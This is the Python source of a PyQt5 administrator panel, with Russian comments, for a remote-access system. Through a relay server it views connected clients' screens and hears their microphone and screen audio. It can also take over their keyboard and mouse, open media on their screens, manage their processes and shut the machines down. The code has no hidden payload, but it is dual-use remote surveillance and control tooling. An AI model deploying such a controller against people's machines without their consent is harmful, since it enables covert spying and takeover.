import json
import socket
import struct
import sys
import threading

from PyQt5.QtCore import Qt, QObject, pyqtSignal
from PyQt5.QtGui import QPixmap
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QComboBox, QLineEdit, QPushButton, QMessageBox, QMenuBar, QAction
)

# Импорт миксинов
from functions.audio import AudioMixin
from functions.screen import ScreenMixin
from functions.control import ControlMixin
from functions.media import MediaMixin
from functions.files import FilesMixin
from functions.mahine_contrl import MachineControlMixin
from functions.taskmanager import TaskManagerMixin

# Данные для входа
SERVER_HOST = "" # Адрес сервера
SERVER_PORT = 11 # Порт сервера
ADMIN_PASSWORD = "" # Админ пароль

# Task Manager + Media + Mahine Control + Control (Mouse + Keyboard) порт
ACTION_PORT = 33

# Аудио порт
AUDIO_PORT = 22

MAX_PACKET_SIZE = 8 * 1024 * 1024


def recv_exact(sock, count):
    data = bytearray()
    while len(data) < count:
        chunk = sock.recv(count - len(data))
        if not chunk:
            return None
        data.extend(chunk)
    return bytes(data)


def recv_packet(sock):
    header = recv_exact(sock, 5)
    if header is None:
        return None, None
    packet_type = header[0]
    size = struct.unpack("!I", header[1:])[0]
    if size > MAX_PACKET_SIZE:
        raise ValueError(f"Пакет слишком большой: {size} байт")
    payload = recv_exact(sock, size)
    if payload is None:
        return None, None
    return packet_type, payload


class UiSignals(QObject):
    status = pyqtSignal(str)
    client_list = pyqtSignal(list)
    frame = pyqtSignal(str, bytes)
    finished = pyqtSignal()
    audio_status = pyqtSignal(str)


class ScreenViewer(AudioMixin, ScreenMixin, ControlMixin, MediaMixin, FilesMixin, MachineControlMixin, TaskManagerMixin, QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Administrator - Screen + Audio")
        self.resize(1100, 720)

        self.sock = None
        self.network_thread = None
        self.stop_event = threading.Event()
        self.selected_client = None
        self.last_frame = None

        self.audio_sock = None
        self.audio_thread = None
        self.audio_stop_event = threading.Event()
        self.audio_muted = False

        self.signals = UiSignals()
        self.signals.status.connect(self.set_status)
        self.signals.client_list.connect(self.refresh_clients)
        self.signals.frame.connect(self.receive_frame)
        self.signals.finished.connect(self.on_network_finished)
        self.signals.audio_status.connect(self.set_audio_status)

        root = QVBoxLayout(self)

        menubar = QMenuBar(self)
        root.setMenuBar(menubar)

        # ====== Вкладка Звук ======
        sound_menu = menubar.addMenu("Звук")

        self.mute_action = QAction("Заглушить звук микрофона", self)
        self.mute_action.setCheckable(True)
        self.mute_action.toggled.connect(self.toggle_mute)
        sound_menu.addAction(self.mute_action)

        self.mute_screen = QAction("Заглушить звук экрана", self)
        self.mute_screen.setCheckable(True)
        self.mute_screen.toggled.connect(self.mute_screen_toggled)
        sound_menu.addAction(self.mute_screen)

        self.reproduce_sound = QAction("Воспроизвести звук", self)
        self.reproduce_sound.setCheckable(True)
        self.reproduce_sound.toggled.connect(self.reproduce_sound_toggled)
        sound_menu.addAction(self.reproduce_sound)

        # ====== Вкладка Контроль ======
        control_menu = menubar.addMenu("Контроль")

        self.control_keyboard = QAction("Включить контроль клавиатуры", self)
        self.control_keyboard.setCheckable(True)
        self.control_keyboard.toggled.connect(self.control_keyboard_toggled)
        control_menu.addAction(self.control_keyboard)

        self.contol_mouse = QAction("Включить контроль мыши", self)
        self.contol_mouse.setCheckable(True)
        self.contol_mouse.toggled.connect(self.control_mouse_toggled)
        control_menu.addAction(self.contol_mouse)

        # ====== Вкладка Откртие медиа ======
        open_media_on_screen = menubar.addMenu("Открытие медиа")

        self.open_media = QAction("Открыть", self)
        self.open_media.setCheckable(True)
        self.open_media.toggled.connect(self.open_media_toggled)
        open_media_on_screen.addAction(self.open_media)

        self.fullsreen_media = QAction("Открыть на весь экран", self)
        self.fullsreen_media.setCheckable(True)
        self.fullsreen_media.toggled.connect(self.fullscreen_media_toggled)
        open_media_on_screen.addAction(self.fullsreen_media)

        # ====== Вкладка Файлы ======
        files_download_install = menubar.addMenu("Файлы")

        self.developed_function = QAction("В разработке", self)
        self.developed_function.triggered.connect(self.files_developed_function)
        files_download_install.addAction(self.developed_function)
        # ====== Вкладка Процессы ======
        task_manager = menubar.addMenu("Процессы")

        self.open_task_manager = QAction("Открыть все процессы", self)
        self.open_task_manager.setCheckable(True)
        self.open_task_manager.toggled.connect(self.open_task_manager_toggled)
        task_manager.addAction(self.open_task_manager)

        self.close_task_process = QAction("Закрыть процесс по названию", self)
        self.close_task_process.setCheckable(True)
        self.close_task_process.toggled.connect(self.close_task_process_toggled)
        task_manager.addAction(self.close_task_process)

        self.open_task_process = QAction("Открыть процесс по названию", self)
        self.open_task_process.setCheckable(True)
        self.open_task_process.toggled.connect(self.open_task_process_toggled)
        task_manager.addAction(self.open_task_process)

        # ====== Вкладка Действие с компьютером ======
        machine_control = menubar.addMenu("Действие с компьютером")

        self.machine_restart = QAction("Перезагрузить", self)
        self.machine_restart.setCheckable(True)
        self.machine_restart.toggled.connect(self.machine_restart_toggled)
        machine_control.addAction(self.machine_restart)

        self.machine_shutdown = QAction("Выключить", self)
        self.machine_shutdown.setCheckable(True)
        self.machine_shutdown.toggled.connect(self.machine_shutdown_toggled)
        machine_control.addAction(self.machine_shutdown)

        controls = QHBoxLayout()
        controls.addWidget(QLabel("Сервер:"))
        self.host_input = QLineEdit(SERVER_HOST)
        self.host_input.setMinimumWidth(150)
        controls.addWidget(self.host_input)

        controls.addWidget(QLabel("Порт экрана:"))
        self.port_input = QLineEdit(str(SERVER_PORT))
        self.port_input.setMaximumWidth(85)
        controls.addWidget(self.port_input)

        controls.addWidget(QLabel("Пароль:"))
        self.password_input = QLineEdit(ADMIN_PASSWORD)
        self.password_input.setEchoMode(QLineEdit.Password)
        self.password_input.setMinimumWidth(140)
        controls.addWidget(self.password_input)

        self.connect_button = QPushButton("Подключиться")
        self.connect_button.clicked.connect(self.toggle_connection)
        controls.addWidget(self.connect_button)
        root.addLayout(controls)

        audio_controls = QHBoxLayout()
        audio_controls.addWidget(QLabel("Порт звука:"))
        self.audio_port_input = QLineEdit(str(AUDIO_PORT))
        self.audio_port_input.setMaximumWidth(85)
        audio_controls.addWidget(self.audio_port_input)

        self.audio_connect_button = QPushButton("Подключить звук")
        self.audio_connect_button.clicked.connect(self.toggle_audio)
        audio_controls.addWidget(self.audio_connect_button)

        self.audio_status_label = QLabel("Звук не подключён")
        audio_controls.addWidget(self.audio_status_label, 1)
        root.addLayout(audio_controls)

        select_row = QHBoxLayout()
        select_row.addWidget(QLabel("Выбрать клиента:"))
        self.client_combo = QComboBox()
        self.client_combo.setMinimumWidth(160)
        self.client_combo.currentTextChanged.connect(self.select_client)
        select_row.addWidget(self.client_combo)
        self.status_label = QLabel("Не подключено")
        select_row.addWidget(self.status_label, 1)
        root.addLayout(select_row)

        self.screen_label = QLabel("Подключись к серверу, чтобы увидеть клиентов")
        self.screen_label.setAlignment(Qt.AlignCenter)
        self.screen_label.setMinimumSize(320, 240)
        self.screen_label.setStyleSheet(
            "QLabel { background: #171717; color: #dddddd; border: 1px solid #444; }"
        )
        root.addWidget(self.screen_label, 1)

    def toggle_connection(self):
        if self.network_thread and self.network_thread.is_alive():
            self.disconnect_from_server()
        else:
            self.connect_to_server()

    def connect_to_server(self):
        host = self.host_input.text().strip()
        password = self.password_input.text()
        try:
            port = int(self.port_input.text().strip())
            if not host or not 1 <= port <= 65535:
                raise ValueError("Укажи корректный адрес сервера и порт")
            if not password or "REPLACE_WITH_" in password:
                raise ValueError("Впиши пароль в поле «Пароль")
        except ValueError as exc:
            QMessageBox.warning(self, "Настройки подключения", str(exc))
            return

        self.stop_event.clear()
        self.host_input.setEnabled(False)
        self.port_input.setEnabled(False)
        self.password_input.setEnabled(False)
        self.connect_button.setEnabled(False)
        self.set_status("Подключение...")
        self.screen_label.setText("Подключение к серверу...")
        self.client_combo.clear()

        self.network_thread = threading.Thread(
            target=self.network_loop, args=(host, port, password), daemon=True
        )
        self.network_thread.start()

    def network_loop(self, host, port, password):
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=10)
            sock.settimeout(10)
            hello = json.dumps(
                {"role": "admin", "token": password}, separators=(",", ":")
            ).encode("utf-8") + b"\n"
            sock.sendall(hello)

            response = bytearray()
            while b"\n" not in response:
                chunk = sock.recv(1)
                if not chunk:
                    raise ConnectionError(
                        "Сервер закрыл соединение до ответа."
                    )
                response.extend(chunk)
                if len(response) > 2048:
                    raise RuntimeError("Некорректный ответ сервера")

            result = json.loads(response.decode("utf-8").strip())
            if not result.get("ok"):
                raise RuntimeError(result.get("error", "Сервер отклонил подключение"))

            sock.settimeout(None)
            self.sock = sock
            self.signals.status.emit("Подключено к серверу")
            self.signals.client_list.emit([])

            while not self.stop_event.is_set():
                packet_type, payload = recv_packet(sock)
                if packet_type is None:
                    break
                if packet_type == 1:
                    try:
                        message = json.loads(payload.decode("utf-8"))
                        if message.get("event") == "clients":
                            self.signals.client_list.emit(message.get("clients", []))
                    except (UnicodeDecodeError, json.JSONDecodeError):
                        continue
                elif packet_type == 2 and payload:
                    id_length = payload[0]
                    if len(payload) <= 1 + id_length:
                        continue
                    client_id = payload[1:1 + id_length].decode("utf-8", "replace")
                    self.signals.frame.emit(client_id, payload[1 + id_length:])

            if not self.stop_event.is_set():
                self.signals.status.emit("Соединение с сервером закрыто")
        except Exception as exc:
            if not self.stop_event.is_set():
                self.signals.status.emit(f"Ошибка: {exc}")
        finally:
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
            self.sock = None
            self.signals.status.emit(
                "Отключено" if self.stop_event.is_set() else "Подключение завершено"
            )
            self.signals.finished.emit()

    def on_network_finished(self):
        self.host_input.setEnabled(True)
        self.port_input.setEnabled(True)
        self.password_input.setEnabled(True)
        self.connect_button.setEnabled(True)
        self.connect_button.setText("Подключиться")

    def set_status(self, text):
        self.status_label.setText(text)
        if text.startswith("Подключено"):
            self.connect_button.setEnabled(True)
            self.connect_button.setText("Отключиться")
        elif text.startswith("Ошибка:") or text in (
            "Отключено", "Соединение с сервером закрыто", "Подключение завершено"
        ):
            self.host_input.setEnabled(True)
            self.port_input.setEnabled(True)
            self.password_input.setEnabled(True)
            self.connect_button.setEnabled(True)
            self.connect_button.setText("Подключиться")

    def refresh_clients(self, clients):
        old_selection = self.client_combo.currentText()
        self.client_combo.blockSignals(True)
        self.client_combo.clear()
        self.client_combo.addItems(clients)
        if old_selection in clients:
            self.client_combo.setCurrentText(old_selection)
        self.client_combo.blockSignals(False)
        self.selected_client = self.client_combo.currentText() or None
        if not clients:
            self.last_frame = None
            self.screen_label.setPixmap(QPixmap())
            self.screen_label.setText("Нет подключённых клиентов")
        elif self.selected_client:
            self.screen_label.setText(f"Ожидание кадров от {self.selected_client}")

    def select_client(self, client_id):
        self.selected_client = client_id or None
        self.last_frame = None
        self.screen_label.setPixmap(QPixmap())
        if client_id:
            self.screen_label.setText(f"Ожидание кадров от {client_id}")
        else:
            self.screen_label.setText("Выбери подключённого клиента")

    def disconnect_from_server(self):
        self.stop_event.set()
        sock = self.sock
        if sock:
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass
        self.connect_button.setText("Отключение...")
        self.connect_button.setEnabled(False)
        self.set_status("Отключение...")

    def closeEvent(self, event):
        self.stop_event.set()
        if self.sock:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                self.sock.close()
            except OSError:
                pass
        self.stop_audio()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    viewer = ScreenViewer()
    viewer.show()
    sys.exit(app.exec_())
